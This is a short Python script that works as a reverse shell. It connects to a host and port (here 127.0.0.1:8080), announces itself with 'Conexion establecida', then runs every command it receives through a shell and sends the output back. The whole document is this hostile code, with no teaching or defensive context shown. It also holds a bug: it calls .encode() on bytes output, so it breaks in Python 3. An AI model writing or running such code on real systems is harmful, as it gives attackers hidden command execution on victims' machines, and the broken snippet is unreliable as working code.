import socket
import subprocess

target = '127.0.0.1'
port = int(8080)
data = "Conexion establecida"
def exec(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((target, port))
connection.send(data.encode())

while True:
    command = connection.recv(1024)
    result_command = exec(command)
    connection.send(result_command.encode())
connection.close()
